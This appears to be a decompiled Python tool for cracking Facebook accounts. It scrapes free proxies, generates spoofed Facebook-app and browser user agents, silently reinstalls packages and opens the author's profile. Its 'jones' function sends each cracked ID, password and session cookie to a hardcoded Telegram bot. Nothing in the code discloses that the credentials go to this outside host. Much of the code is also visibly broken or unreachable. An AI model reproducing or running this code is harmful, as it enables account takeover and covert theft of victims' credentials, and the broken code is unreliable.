#Open-Sourced By Harry Akumaa.

def modules():
    print('\x1b[1;37m [\x1b[36m•\x1b[1;37m] CHECKING  UPDATES \x1b[1;37m')
    os.system('pkg update -y && pkg upgrade -y')
    os.system('clear')
    import rich
    if ModuleNotFoundError:
        print('\x1b[1;37m [\x1b[36m•\x1b[1;37m] RICH IS BEING INSTALLED \x1b[1;37m')
        os.system('pip install rich --quiet')
        print('\x1b[1;37m [\x1b[36m>>\x1b[1;37m] RICH HAS BEEN INSTALLED \x1b[1;37m')
    exit()
    import bs4
    if ModuleNotFoundError:
        print('\x1b[1;37m [\x1b[36m•\x1b[1;37m] BS4 IS BEING INSTALLED \x1b[1;37m')
        os.system('pip install bs4 --quiet')
        print('\x1b[1;37m [\x1b[36m>>\x1b[1;37m] BS4 HAS BEEN INSTALLED \x1b[1;37m')
    exit()
    import requests
    if ModuleNotFoundError:
        print('\x1b[1;37m [\x1b[36m•\x1b[1;37m] REQUESTS IS BEING INSTALLED \x1b[1;37m')
        os.system('pip install requests --quiet')
        print('\x1b[1;37m [\x1b[36m>>\x1b[1;37m] REQUESTS HAS BEEN INSTALLED \x1b[1;37m')
    exit()
    exit()

import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import multiprocessing
import socket
import string
from bs4 import BeautifulSoup as bs
from bs4 import BeautifulSoup
import urllib3
import rich
import base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as prints
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON = sol()
if ModuleNotFoundError:
    modules()
os.system('pip uninstall requests chardet urllib3 idna certifi -y')
os.system('pip install chardet urllib3 idna certifi requests')
os.system('xdg-open https://www.facebook.com/profile.php?id=100084565670977')
ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []
prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
open('.prox.txt', 'w').write(prox)
if Exception:
    e = None
    e = None
    del e
    e = None
    del e
prox = open('.prox.txt', 'r').read().splitlines()

def windows():
    aV = str(random.choice(range(10, 20)))
    A = f'''Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}'''
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'''5{bx}.{bV}'''
    B = f'''Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice([
        '2',
        '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}'''
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'''5{cx}.{cV}'''
    C = f'''Mozilla/5.0 (Windows NT 6.{str(random.choice([
        '2',
        '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}'''
    D = f'''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36'''
    return random.choice([
        A,
        B,
        C,
        D])

mcc = random.choice([
    'SM-F711B',
    'SM-F711N',
    'SM-F711U',
    'SM-F711U1',
    'SM-E025F',
    'SM-T575',
    'SM-A516V',
    'SM-M017F',
    'SM-J260GU',
    'SM-J260GU',
    'SM-J260FU',
    'SM-J260MU',
    'SM-A716F',
    'SM-A716F',
    'SM-A716F',
    'SM-A7160',
    'SM-A716B',
    'SM-A716U',
    'SM-A716B',
    'SM-M115F',
    'SM-M115F',
    'SM-M115M',
    'SM-M115M',
    'SM-G988',
    'SM-G988U',
    'SM-G988U1',
    'SM-G9880',
    'SM-G988B',
    'SM-G988N',
    'SM-G988B',
    'SM-T927A',
    'SM-T920',
    'SM-A305F',
    'SM-A305FN',
    'SM-A305G',
    'SM-A305GN',
    'SM-A305YN',
    'SM-A3050',
    'SM-A305N',
    'SM-A305GT',
    'SM-A105F',
    'SM-A105G',
    'SM-A105M',
    'SM-A105FN',
    'SM-A920F',
    'SM-A9200',
    'SM-A920N',
    'SM-A920X',
    'SM-N960F',
    'SM-N9600',
    'SM-N960F',
    'SM-N960U',
    'SM-N960U1',
    'SM-N960N',
    'SM-N960W',
    'SM-N960X',
    'SCV40'])

def trish():
    vchrome = str(random.randint(100, 925)) + '.0.0.' + str(random.randint(1, 8)) + '.' + str(random.randint(40, 150))
    VAPP = random.randint(410000000, 499999999)
    END = '[FBAN/FB4A;FBAV/326.0.0.24.120;FBBV/285215826;FBDM/{density=2.0,width=1080,height=1920};FBLC/en_NP;FBRV/285811526;FBCR/Azercell;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/' + str(redmi) + ';FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'
    ua = f'''Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {redmi}  Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ''' + END
    return ua

oppo = random.choice([
    'CPH1869',
    'CPH1929',
    'CPH2107',
    'CPH2238',
    'CPH2389',
    'CPH2401',
    'CPH2407',
    'CPH2413',
    'CPH2415',
    'CPH2417',
    'CPH2419',
    'CPH2455',
    'CPH2459',
    'CPH2461',
    'CPH2471',
    'CPH2473',
    'CPH2477',
    'CPH8893',
    'CPH2321',
    'CPH2341',
    'CPH2373',
    'CPH2083',
    'CPH2071',
    'CPH2077',
    'CPH2185',
    'CPH2179',
    'CPH2269',
    'CPH2421',
    'CPH2349',
    'CPH2271',
    'CPH1923',
    'CPH1925',
    'CPH1837',
    'CPH2015',
    'CPH2073',
    'CPH2081',
    'CPH2029',
    'CPH2031',
    'CPH2137',
    'CPH1605',
    'CPH1803',
    'CPH1853',
    'CPH1805',
    'CPH1809',
    'CPH1851',
    'CPH1931',
    'CPH1959',
    'CPH1933',
    'CPH1935',
    'CPH1943',
    'CPH2061',
    'CPH2069',
    'CPH2127',
    'CPH2131',
    'CPH2139',
    'CPH2135',
    'CPH2239',
    'CPH2195',
    'CPH2273',
    'CPH2325',
    'CPH2309',
    'CPH1701',
    'CPH2387',
    'CPH1909',
    'CPH1920',
    'CPH1912',
    'CPH1901',
    'CPH1903',
    'CPH1905',
    'CPH1717',
    'CPH1801',
    'CPH2067',
    'CPH2099',
    'CPH2161',
    'CPH2219',
    'CPH2197',
    'CPH2263',
    'CPH2375',
    'CPH2339',
    'CPH1715',
    'CPH2385',
    'CPH1729',
    'CPH1827',
    'CPH1938',
    'CPH1937',
    'CPH1939',
    'CPH1941',
    'CPH2001',
    'CPH2021',
    'CPH2059',
    'CPH2121',
    'CPH2123',
    'CPH2203',
    'CPH2333',
    'CPH2365',
    'CPH1913',
    'CPH1911',
    'CPH1915',
    'CPH1969',
    'CPH2209',
    'CPH1987',
    'CPH2095',
    'CPH2119',
    'CPH2285',
    'CPH2213',
    'CPH2223',
    'CPH2363',
    'CPH1609',
    'CPH1613',
    'CPH1723',
    'CPH1727',
    'CPH1725',
    'CPH1819',
    'CPH1821',
    'CPH1825',
    'CPH1881',
    'CPH1823',
    'CPH1871',
    'CPH1875',
    'CPH2023',
    'CPH2005',
    'CPH2025',
    'CPH2207',
    'CPH2173',
    'CPH2307',
    'CPH2305',
    'CPH2337',
    'CPH1955',
    'CPH1707',
    'CPH1719',
    'CPH1721',
    'CPH1835',
    'CPH1831',
    'CPH1833',
    'CPH1879',
    'CPH1893',
    'CPH1877',
    'CPH1607',
    'CPH1611',
    'CPH1917',
    'CPH1919',
    'CPH1907',
    'CPH1989',
    'CPH1945',
    'CPH1951',
    'CPH2043',
    'CPH2035',
    'CPH2037',
    'CPH2036',
    'CPH2009',
    'CPH2013',
    'CPH2113',
    'CPH2091',
    'CPH2125',
    'CPH2109',
    'CPH2089',
    'CPH2065',
    'CPH2159',
    'CPH2145',
    'CPH2205',
    'CPH2201',
    'CPH2199',
    'CPH2217',
    'CPH1921',
    'CPH2211',
    'CPH2235',
    'CPH2251',
    'CPH2249',
    'CPH2247',
    'CPH2237',
    'CPH2371',
    'CPH2293',
    'CPH2353',
    'CPH2343',
    'CPH2359',
    'CPH2357',
    'CPH2457',
    'CPH1983',
    'CPH1979'])
realme = random.choice([
    'RMX3516',
    'RMX3371',
    'RMX3461',
    'RMX3286',
    'RMX3561',
    'RMX3388',
    'RMX3311',
    'RMX3142',
    'RMX2071',
    'RMX1805',
    'RMX1809',
    'RMX1801',
    'RMX1807',
    'RMX1803',
    'RMX1825',
    'RMX1821',
    'RMX1822',
    'RMX1833',
    'RMX1851',
    'RMX1853',
    'RMX1827',
    'RMX1911',
    'RMX1919',
    'RMX1927',
    'RMX1971',
    'RMX1973',
    'RMX2030',
    'RMX2032',
    'RMX1925',
    'RMX1929',
    'RMX2001',
    'RMX2061',
    'RMX2063',
    'RMX2040',
    'RMX2042',
    'RMX2002',
    'RMX2151',
    'RMX2163',
    'RMX2155',
    'RMX2170',
    'RMX2103',
    'RMX3085',
    'RMX3241',
    'RMX3081',
    'RMX3151',
    'RMX3381',
    'RMX3521',
    'RMX3474',
    'RMX3471',
    'RMX3472',
    'RMX3392',
    'RMX3393',
    'RMX3491',
    'RMX1811',
    'RMX2185',
    'RMX3231',
    'RMX2189',
    'RMX2180',
    'RMX2195',
    'RMX2101',
    'RMX1941',
    'RMX1945',
    'RMX3063',
    'RMX3061',
    'RMX3201',
    'RMX3203',
    'RMX3261',
    'RMX3263',
    'RMX3193',
    'RMX3191',
    'RMX3195',
    'RMX3197',
    'RMX3265',
    'RMX3268',
    'RMX3269',
    'RMX2027',
    'RMX2020',
    'RMX2021',
    'RMX3581',
    'RMX3501',
    'RMX3503',
    'RMX3511',
    'RMX3310',
    'RMX3312',
    'RMX3551',
    'RMX3301',
    'RMX3300',
    'RMX2202',
    'RMX3363',
    'RMX3360',
    'RMX3366',
    'RMX3361',
    'RMX3031',
    'RMX3370',
    'RMX3357',
    'RMX3560',
    'RMX3562',
    'RMX3350',
    'RMX2193',
    'RMX2161',
    'RMX2050',
    'RMX2156',
    'RMX3242',
    'RMX3171',
    'RMX3430',
    'RMX3235',
    'RMX3506',
    'RMX2117',
    'RMX2173',
    'RMX3161',
    'RMX2205',
    'RMX3462',
    'RMX3478',
    'RMX3372',
    'RMX3574',
    'RMX1831',
    'RMX3121',
    'RMX3122',
    'RMX3125',
    'RMX3043',
    'RMX3042',
    'RMX3041',
    'RMX3092',
    'RMX3093',
    'RMX3571',
    'RMX3475',
    'RMX2200',
    'RMX2201',
    'RMX2111',
    'RMX2112',
    'RMX1901',
    'RMX1903',
    'RMX1992',
    'RMX1993',
    'RMX1991',
    'RMX1931',
    'RMX2142',
    'RMX2081',
    'RMX2085',
    'RMX2083',
    'RMX2086',
    'RMX2144',
    'RMX2051',
    'RMX2025',
    'RMX2075',
    'RMX2076',
    'RMX2072',
    'RMX2052',
    'RMX2176',
    'RMX2121',
    'RMX3115',
    'RMX1921'])
infinix = random.choice([
    'X676B',
    'X687',
    'X609',
    'X697',
    'X680D',
    'X507',
    'X605',
    'X668',
    'X6815B',
    'X624',
    'X655F',
    'X689C',
    'X608',
    'X698',
    'X682B',
    'X682C',
    'X688C',
    'X688B',
    'X658E',
    'X659B',
    'X689B',
    'X689',
    'X689D',
    'X662',
    'X662B',
    'X675',
    'X6812B',
    'X6812',
    'X6817B',
    'X6817',
    'X6816C',
    'X6816',
    'X6816D',
    'X668C',
    'X665B',
    'X665E',
    'X510',
    'X559C',
    'X559F',
    'X559',
    'X606',
    'X606C',
    'X606D',
    'X623',
    'X624B',
    'X625C',
    'X625D',
    'X625B',
    'X650D',
    'X650B',
    'X650',
    'X650C',
    'X655C',
    'X655D',
    'X680B',
    'X573',
    'X573B',
    'X622',
    'X693',
    'X695C',
    'X695D',
    'X695',
    'X663B',
    'X663',
    'X670',
    'X671',
    'X671B',
    'X672',
    'X6819',
    'X572',
    'X572-LTE',
    'X571',
    'X604',
    'X610B',
    'X690',
    'X690B',
    'X656',
    'X692',
    'X683',
    'X450',
    'X5010',
    'X501',
    'X401',
    'X626',
    'X626B',
    'X652',
    'X652A',
    'X652B',
    'X652C',
    'X660B',
    'X660C',
    'X660',
    'X5515',
    'X5515F',
    'X5515I',
    'X609B',
    'X5514D',
    'X5516B',
    'X5516C',
    'X627',
    'X680',
    'X653',
    'X653C',
    'X657',
    'X657B',
    'X657C',
    'X6511B',
    'X6511E',
    'X6511',
    'X6512',
    'X6823C',
    'X612B',
    'X612',
    'X503',
    'X511',
    'X352',
    'X351',
    'X530',
    'X676C',
    'X6821',
    'X6823',
    'X6827',
    'X509',
    'X603',
    'X6815',
    'X620B',
    'X620',
    'X687B',
    'X6811B',
    'X6810',
    'X6811'])
samsung = random.choice([
    'SM-G920F|NRD90M',
    'SM-T535|LRX22G',
    'SM-T231|KOT49H',
    'SM-J320F|LMY47V',
    'GT-I9190|KOT49H',
    'GT-N7100|KOT49H',
    'SM-T561|KTU84P',
    'GT-N7100|KOT49H',
    'GT-I9500|LRX22C',
    'SM-J320F|LMY47V',
    'SM-G930F|NRD90M',
    'SM-J320F|LMY47V',
    'SM-J510FN|NMF26X',
    'GT-P5100|IML74K',
    'SM-J320F|LMY47V',
    'GT-N8000|JZO54K',
    'SM-T531|LRX22G',
    'SPH-L720|KOT49H',
    'GT-I9500|JDQ39',
    'SM-G935F|NRD90M',
    'SM-T561|KTU84P',
    'SM-T531|KOT49H',
    'SM-J320FN|LMY47V',
    'SM-A500F|MMB29M',
    'SM-A500FU|MMB29M',
    'SM-A500F|MMB29M',
    'SM-T311|KOT49H',
    'SM-T531|LRX22G',
    'SM-J320F|LMY47V',
    'SM-J320FN|LMY47V',
    'SM-J320F|LMY47V',
    'GT-P5210|KOT49H',
    'SM-T230|KOT49H',
    'GT-I9192|KOT49H',
    'SM-T235|KOT4',
    'GT-N7100|KOT49H',
    'SM-A500F|LRX22G',
    'SM-A500F|MMB29M',
    'GT-N7100|KOT49H',
    'SM-G920F|MMB29K',
    'SM-J510FN|NMF26X',
    'GT-N8000|JZO54K',
    'SM-J320FN|LMY47V',
    'SM-J320FN|LMY47V',
    'SM-A500H|MMB29M',
    'GT-I9300|JSS15J',
    'GT-I9500|LRX22C',
    'SM-J320F|LMY4',
    'SM-J510FN|NMF26X',
    'SM-A500F|MMB29M',
    'GT-N8000|KOT49H',
    'SM-T561|KTU84P',
    'SM-G900F|KOT49H',
    'GT-S7390|JZO54K',
    'SM-J320F|LMY47V',
    'GT-P5100|JZO54K',
    'SM-A500FU|MMB29M',
    'SM-G930F|NRD90M',
    'SM-J510FN|NMF26X',
    'SM-T561|KTU84P',
    'GT-N8000|KOT49H',
    'SM-T531|LRX22G',
    'SM-J510FN|MMB29M',
    'SM-J510FN|NMF26X',
    'SM-J320F|LMY47V',
    'GT-P5110|JDQ39',
    'GT-I9301I|KOT49H',
    'SM-A500F|LRX22G',
    'SM-G930F|NRD90M',
    'SM-T311|KOT4',
    'GT-P5200|KO0|JZO54K',
    'SM-J320H|LMY47V',
    'SM-T231|KOT49H',
    'SM-G930F|NRD90M',
    'SM-G935F|NRD90M',
    'SM-T310|KOT49H',
    'GT-N8000|KOT49H',
    'GT-I9300I|KTU84P',
    'SM-G920F|NRD90M',
    'SM-J510FN|NMF26X',
    'SM-T705|LRX22G;',
    'GT-P3110|JZO54K',
    'GT-I9192|KOT49H',
    'SM-J320F|LMY47V',
    'SM-G920F|NRD90M',
    'GT-I9300|IMM76D',
    'SM-G950F|NRD90M',
    'SM-J320F|LMY47V',
    'SM-J510FN|NMF26X;',
    'SM-J701F|NRD90M',
    'SM-A500F|LRX22G',
    'SM-T231|KOT49H',
    'SM-T311|KOT49H',
    'SM-J320FN|LMY47V',
    'GT-P5210|KOT49H',
    'SM-T805|LRX22G',
    'GT-I9500|LRX22C',
    'GT-P5200|KOT49H',
    'GT-I9301I|KOT49H',
    'SM-A500F|MMB29M',
    'GT-I9192|KOT49H',
    'GT-P5100|JDQ',
    'SM-T311|KOT49H'])
mamu = requests.get('https://gist.githubusercontent.com/REFAT-156/ce32dac4fd13dc22eb94c9ef5003300f/raw/8b89908acc56beabce9eb329e7873e8e58702515/').text.splitlines()

def machikney():
    facebook_version = f'''{random.randint(10, 437)}.0.0.{random.randint(1, 99)}.{random.randint(1, 200)}'''
    fbbv = str(random.randint(10000000, 99999999))
    fbsv = f'''{random.uniform(4, 10):.1f}'''
    density = random.choice([
        '2.0',
        '2.25',
        '2.75',
        '3.0',
        '3.25',
        '3 75'])
    width = random.randint(720, 1440)
    height = random.randint(1080, 2560)
    fblc = random.choice([
        'ja_JP',
        'ex_MX',
        'en_CU',
        'en_US',
        'fr_FR',
        'fa_IR',
        'es_ES',
        'pt_BR',
        'de_DE',
        'it_IT',
        'ja_JP',
        'ko_KR',
        'ru_RU',
        'zh_CN',
        'ar_AE',
        'en_GB'])
    fbcr = random.choice([
        'Telenor',
        'fido',
        'MOVO AFRICA',
        'UFONE-PAKTel',
        'Zong',
        'Jazz',
        'SCO',
        'Jio',
        'Vodafone',
        'Airtel',
        'BSNL',
        'MTNL',
        'Grameenphone',
        'Robi',
        'Banglalink',
        'Teletalk',
        'Telkomsel',
        'Indosat Ooredoo',
        'Axiata',
        'Tri',
        'Smartfren',
        'China Mobile',
        'Unicom',
        'Telecom',
        'Satcom',
        'Docomo',
        'Rakuten',
        'IIJmio',
        'Orange',
        'Verizon',
        'AT&T',
        'T-Mobile',
        'Sprint',
        'Vodafone',
        'Telefonica',
        'EE',
        'Orange',
        'Three'])
    fban = random.choice([
        'FB4A',
        'FB5A',
        'FB6A'])
    fbpn = random.choice([
        'com.facebook.katana',
        'com.facebook.orca',
        'messenger-android',
        'com.facebook.lite'])
    redmi = random.choice([
        '2201116SI',
        'M2012K11AI',
        '22011119TI',
        '21091116UI',
        'M2102K1AC',
        'M2012K11I',
        '22041219I',
        '22041216I',
        '2203121C',
        '2106118C',
        '2201123G',
        '2203129G',
        '2201122G',
        '2201122C',
        '2206122SC',
        '22081212C',
        '2112123AG',
        '2112123AC',
        '2109119BC',
        'M2002J9G',
        'M2007J1SC',
        'M2007J17I',
        'M2102J2SC',
        'M2007J3SY',
        'M2007J17G',
        'M2007J3SG',
        'M2011K2G',
        'M2101K9AG ',
        'M2101K9R',
        '2109119DG',
        'M2101K9G',
        '2109119DI',
        'M2012K11G',
        'M2102K1G',
        '21081111RG',
        '2107113SG',
        '21051182G',
        'M2105K81AC',
        'M2105K81C',
        '21061119DG',
        '21121119SG',
        '22011119UY',
        '21061119AG',
        '21061119AL',
        '22041219NY',
        '22041219G',
        '21061119BI',
        '220233L2G',
        '220233L2I',
        '220333QNY',
        '220333QAG',
        'M2004J7AC',
        'M2004J7BC',
        'M2004J19C',
        'M2006C3MII',
        'M2010J19SI',
        'M2006C3LG',
        'M2006C3LVG',
        'M2006C3MG',
        'M2006C3MT',
        'M2006C3MNG',
        'M2006C3LII',
        'M2010J19SL',
        'M2010J19SG',
        'M2010J19SY',
        'M2012K11AC',
        'M2012K10C',
        'M2012K11C',
        '22021211RC'])
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(10, 450)) + '.0.0.' + str(random.randrange(5, 49)) + '.' + str(random.randint(50, 200)) + ';FBBV/' + str(random.randint(0, 999999999)) + ';' + f'''[FBAN/FB4A;FBAV/50.0.0.2362;FBBV/4692916[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/samsung;FBBD/samsung;FBPN/{fbpn};FBDV/SM-G600FY;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/''' + '{' + f'''density={density},width={width},height={height}]'''
    return ua


def sex():
    density = random.choice([
        '1.0',
        '1.5',
        '2.0',
        '2.25',
        '2.75',
        '2.5',
        '3.0',
        '3.5',
        '4.0'])
    width = random.choice([
        '720',
        '1080'])
    height = random.choice([
        '1280',
        '1440',
        '1920'])
    END = '[FBAN/FB4A;FBAV/' + str(random.randint(30, 450)) + '.0.0.' + str(random.randint(5, 70)) + '.' + str(random.randint(90, 200)) + ';FBBV/' + str(random.randint(111111111, 999999999)) + ';' + f'''[FBAN/FB4A;FBAV/389.0.0.42.111;FBBV/317817216;FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/318410128;FBCR/Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG SHV-E330K;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]'''
    ua = f'''Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {random.choice(mamu)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ''' + END
    return ua

mamu = requests.get('https://gist.githubusercontent.com/REFAT-156/ce32dac4fd13dc22eb94c9ef5003300f/raw/8b89908acc56beabce9eb329e7873e8e58702515/').text.splitlines()

def Mr_RXH():
    version = str(random.randint(5, 14))
    code = str(random.randint(40, 450))
    wid = str(random.randint(720, 1280))
    heigh = str(random.randint(1280, 2400))
    veer = str(random.randint(111111111, 999999999))
    models = random.choice([
        'SM-P610N',
        'SM-P615',
        'SM-P610'])
    model2 = random.choice([
        'RMX3740',
        'RMX3741'])
    model3 = random.choice([
        '220333QAG',
        '220333QBI',
        '220333QNY',
        '220333QL'])
    model4 = random.choice([
        'ASUS_Z017DB',
        'ASUS_Z017D',
        'ASUS_Z017DA',
        'ASUS_Z017DC',
        'ASUS_ZE520KL',
        'ASUS_ZA520KL'])
    facebook = random.choice([
        'com.facebook.adsmanager|MobileAdsManagerAndroid',
        'com.facebook.katana|FB4A',
        'com.facebook.orca|Orca-Android',
        'com.facebook.mlite|MessengerLite'])
    face = facebook.split('|')[1]
    face2 = facebook.split('|')[0]
    ua1 = '[FBAN/' + face + ';FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/' + face + ';FBAV/' + code + '.0.0.22.104;FBPN/' + face2 + ';FBLC/id_ID;FBBV/' + veer + ';FBCR/Vodafone India;FBMF/samsung;FBBD/samsung;FBDV/' + models + ';FBSV/11.8.5;FBCA/armeabi-v7a:armeabi;FBDM/{density=' + str(random.randint(1, 3)) + '.25,width=' + wid + ',height=' + heigh + '};FB_FW/1;]'
    ua2 = '[FBAN/' + face + ';FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/' + face + ';FBAV/' + code + '.0.0.28.111;FBPN/' + face2 + ';FBLC/en_US;FBBV/' + veer + ';FBCR/Cricket;FBMF/Realme;FBBD/Realme;FBDV/' + model2 + ';FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=' + str(random.randint(2, 4)) + '.75,width=' + wid + ',height=' + heigh + '};FB_FW/1;]'
    ua3 = '[FBAN/' + face + ';FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/' + face + ';FBAV/' + code + '.0.0.12.120;FBPN/' + face2 + ';FBLC/en_GB;FBBV/' + veer + ';FBCR/Robi;FBMF/Xiaomi;FBBD/Redmi;FBDV/' + model3 + ';FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=' + str(random.randint(1, 4)) + '.625,width=' + wid + ',height=' + heigh + '};FB_FW/1;]'
    ua4 = '[FBAN/' + face + ';FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/' + face + ';FBAV/' + code + '.0.0.32.114;FBPN/' + face2 + ';FBLC/it_IT;FBBV/' + veer + ';FBCR/Airtel;FBMF/Asus;FBBD/Asus;FBDV/' + model4 + ';FBSV/7.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=' + str(random.randint(1, 3)) + '.0,width=' + wid + ',height=' + heigh + '};FB_FW/1;]'
    return random.choice([
        ua1,
        ua2,
        ua3,
        ua4])

ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []
prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
open('.prox.txt', 'w').write(prox)
if Exception:
    e = None
    e = None
    del e
    e = None
    del e
prox = open('.prox.txt', 'r').read().splitlines()
for xd in range(10000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'
    uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
    ugen2.append(uaku)
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12'])
    c = ' en-us; GT-'
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    for x in range(10):
        a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
        b = random.randrange(100, 9999)
        c = random.randrange(100, 9999)
        d = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        e = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        f = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        g = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        h = random.randrange(1, 9)
        i = '; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
        j = random.randrange(1, 9)
        k = random.randrange(1, 9)
        l = 'Mobile WVGA SMM-MMS/1.2.0 OPN-B'
        uak = f'''{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'''
        
        def uaku():
            ua = open('user-agents.txt', 'r').read().splitlines()
            for ub in ua:
                ugen.append(ub)
                return None
                a = requests.get('https://github.com/cvandeplas/pystemon/blob/master/user-agents.txt').text
                ua = open('user-agents.txt', 'w')
                aa = re.findall('line">(.*?)<', str(a))
                for un in aa:
                    ua.write(un + '\n')
                    ua = open('user-agents.txt', 'r').read().splitlines()
                    return None

        
        def jones(idf, pw, kuki):
            token = '7090613267:AAEjFBlsVzYgrAnZ2s4KCRyDM5s2wPMglF8'
            chatid = '5918006267'
            ok_id = str(idf + '|' + pw + '|' + kuki)
            url = f'''https://api.telegram.org/bot{token}/sendMessage'''
            params = {
                'chat_id': chatid,
                'text': ok_id }
            requests.get(url, params = params)
            return None
            pwv

        (id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
        cokbrut = []
        pwpluss = []
        pwnya = []
        user = []
        logincookie = []
        P = '\x1b[1;97m'
        M = '\x1b[1;91m'
        H = '\x1b[1;92m'
        K = '\x1b[1;93m'
        B = '\x1b[1;94m'
        U = '\x1b[1;95m'
        O = '\x1b[1;96m'
        N = '\x1b[0m'
        Z = '\x1b[1;30m'
        sir = '\x1b[41m\x1b[1;97m'
        x = '\x1b[m'
        m = '\x1b[1;91m'
        k = '\x1b[93m'
